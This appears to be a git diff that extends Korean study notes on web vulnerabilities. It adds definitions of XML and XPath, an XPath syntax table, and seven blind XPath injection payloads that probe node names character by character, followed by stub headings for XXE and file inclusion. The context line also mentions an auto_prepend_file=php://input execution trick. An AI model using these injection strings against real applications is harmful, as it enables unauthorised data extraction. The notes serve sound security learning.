@@ -1134,8 +1134,53 @@ auto_prepend_file=php://input : Http Request Body로부터 data를 가져와 실
 
 ### 기타 주요 웹 취약점 - XML Xpath Injection
 
+**XML/Xpath 인젝션**
+- XML 구조에 악의적인 행위를 일으키는 내용을 삽입
 
+**XML**
+- 데이터를 트리 구조의 노드로 표현, 사용자 정의로 데이터를 분류
 
+**Xpath**
+- 일종의 쿼리
+- XML DB의 내용을 선택/조작
 
+**Xpath 명령어**
+```
+/ : 최상위 노드
+// : 현재 노드로부터 모든 노드 조회
+* : 모든 노드 조회
+. : 현재 노드
+.. : 현재 상위 노드 접근
+parent : 현재 노드의 부모 노드
+child : 현재 노드의 자식 노드
+[] : 조건문
+node() : 현재 노드로부터 모든 노드 조회
+```
 
+**Xpath injection**
+```
+neo' and count(../child::*)=6 or 'a'='b
+neo' and string-length(name(parent::*))=6 or 'a'='b
+neo' and substring(name(parent::*),1,1)='h' or 'a'='b
+neo' and string-length(name(../child::*[position()=1]))=4 or 'a'='b
+neo' and substring(name(../child::*[position()=1]),1,1)='h' or 'a'='b
+neo' and string-length(name(/heroes/child::*))=4 or 'a'='b
+neo' and string-length(name(//*))=6 or 'a'='b
+```
+
+---
+
+### 기타 주요 웹 취약점 - XML 외부 엔티티 공격
+
+---
+
+### 기타 주요 웹 취약점 - 디렉터리 리스팅 파일 삽입
+
+**기능 수준의 접근 통제 누락**
+- 접근 통제와 확인이 서버의 설정이나 관리 측면에서 누락 시 발생
+- 파일 업로드, LFI(Local File Inclusion), 파일 다운로드, RFI(Remote File Inclusion)
+
+---
+
+### 기타 주요 웹 취약점 - Base64 인코딩 복호화, HTML5 웹 저장소
 
